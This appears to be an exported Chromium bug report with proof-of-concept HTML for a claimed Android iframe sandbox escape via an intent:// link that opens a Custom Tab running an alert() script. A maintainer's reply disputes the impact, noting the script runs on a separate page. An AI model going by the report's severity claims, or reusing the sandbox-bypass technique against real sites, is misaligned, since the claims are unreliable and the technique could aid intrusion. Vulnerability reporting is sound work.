@@ -1,0 +1,123 @@
+Issue ID: 441816122
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<h4>1. Create and host two files:</h4>
+<p><strong><code>iframe-test.html</code></strong></p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;&lt;<span class="stx-keyword">title</span>&gt;Intent CCT target=_blank&lt;/<span class="stx-keyword">title</span>&gt;&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+  &lt;<span class="stx-keyword">p</span>&gt;Intent CCT target=_blank&lt;/<span class="stx-keyword">p</span>&gt;
+  &lt;<span class="stx-keyword">iframe</span>
+    sandbox=<span class="stx-string">&quot;allow-popups&quot;</span>
+    srcdoc=<span class="stx-string">&quot;</span>
+<span class="stx-string">      &lt;a href=&#39;intent://YOUR_DOMAIN/execute-script.html#Intent;scheme=https;package=com.chrome.canary;S.android.support.customtabs.extra.SESSION=asdf;end&#39; target=&#39;_blank&#39;&gt;</span>
+<span class="stx-string">        test</span>
+<span class="stx-string">      &lt;/a&gt;&quot;</span>
+  &gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<p><strong><code>execute-script.html</code></strong></p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;&lt;<span class="stx-keyword">title</span>&gt;Execute Script&lt;/<span class="stx-keyword">title</span>&gt;&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+  &lt;<span class="stx-keyword">script</span>&gt;alert(<span class="stx-string">&#39;XSS via sandbox escape&#39;</span>);&lt;/<span class="stx-keyword">script</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<h4>2. Open <code>iframe-test.html</code> in <strong>Chrome</strong> on Android.</h4>
+<h4>3. Tap the <code>test</code> link in the iframe.</h4>
+<h4>4. Android will prompt: <strong>&quot;Open with Chrome or Canary?&quot;</strong></h4>
+<ul>
+<li>Select <strong>Chrome Canary</strong></li>
+</ul>
+<h4>5. A <strong>Custom Chrome Tab (CCT)</strong> opens and runs <code>execute-script.html</code>.</h4>
+<h4>6.  <strong>The <code>alert()</code> runs</strong>, despite the iframe lacking <code>allow-scripts</code>.</h4>
+<ul>
+<li>To reproduce in a live server, please visit: <a href="https://attacker.hackerbro.net/iframe-test.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/iframe-test.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/iframe-test.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3gBUrhmH7BoyPLmvX--fx1">https://attacker.hackerbro.net/iframe-test.html</a></li>
+</ul>
+<h3><strong>Expected Behaviour:</strong></h3>
+<ul>
+<li>The popup or CCT opened by the sandboxed iframe should inherit the sandbox flags.</li>
+<li>JavaScript execution should be blocked unless <code>allow-scripts</code>  <code> allow modals</code>  or <code>allow-popups-to-escape-sandbox</code> is explicitly set.</li>
+</ul>
+<h3><strong>Actual Behavior:</strong></h3>
+<ul>
+<li>The <code>intent://</code> link bypasses the iframe&#39;s sandbox restrictions.</li>
+<li>Opens a new browser context (CCT) that runs untrusted JS (alert) with no sandbox.</li>
+</ul>
+<h3><strong>Recommendation:</strong></h3>
+<ul>
+<li>Prevent Chrome (including CCT) from launching via <code>intent://</code> when the source is a sandboxed iframe <strong>without</strong> <code>allow-popups-to-escape-sandbox</code>.</li>
+</ul>
+<h1>Problem Description</h1>
+<ul>
+<li>A sandboxed iframe (<code>sandbox=&quot;allow-popups&quot;</code>) in Chrome Canary version 141.0.7380.0 on Android can launch a <code>Custom Chrome Tab (CCT)</code> via an <code>intent://</code> URL. This allows JavaScript execution in a context that <strong>should be sandboxed</strong>, effectively bypassing iframe sandbox restrictions.</li>
+<li>This constitutes a <strong>sandbox escape</strong> that leads to <strong>arbitrary script execution (XSS-like behavior)</strong> — violating Chrome&#39;s security model for iframe sandboxing.</li>
+</ul>
+<h3><strong>Affected Platform</strong></h3>
+<ul>
+<li><strong>Browser</strong>: Chrome Canary</li>
+<li><strong>Version</strong>: <code>141.0.7380.0</code></li>
+<li><strong>OS</strong>: Android 13</li>
+</ul>
+<h3><strong>Proof of Concept:</strong></h3>
+<ul>
+<li>I have uploaded the proof of concept video in this report for your review and reference.</li>
+</ul>
+<h3><strong>Security Impact:</strong></h3>
+<ul>
+<li><strong>Sandbox escape → arbitrary JS execution.</strong></li>
+<li>Bypasses trusted browser security controls and same origin policy.</li>
+<li>Privilege escalation in sandbox or isolated environments.</li>
+</ul>
+<h3><strong>References:</strong></h3>
+<p><a href="https://issues.chromium.org/issues/40061025" data-b-widget="issue-reference" data-b-issue-id="40061025">https://issues.chromium.org/issues/40061025</a>
+<a href="https://issues.chromium.org/issues/40063183" data-b-widget="issue-reference" data-b-issue-id="40063183">https://issues.chromium.org/issues/40063183</a>
+<a href="https://issues.chromium.org/issues/40063634" data-b-widget="issue-reference" data-b-issue-id="40063634">https://issues.chromium.org/issues/40063634</a></p>
+<h1>Summary</h1>
+<p>Sandbox Escape via intent:// CCT in Chrome Canary 141.0.7380.0 on Android</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: Yes \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bu...@gmail.com
+Sandbox Escape via intent:// CCT in Chrome Canary 141.0.7380.0 on Android
+
+Author: bu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: li...@chromium.org
+<p>Hi,</p>
+<p>Your PoC uses an intent to navigate to a different page, and that page is executing a script. There&#39;s no evidence that script is executing on the original page or has access to contents from the original page.</p>
+
+Author: li...@chromium.org
+public_non_google
+
+Author: li...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
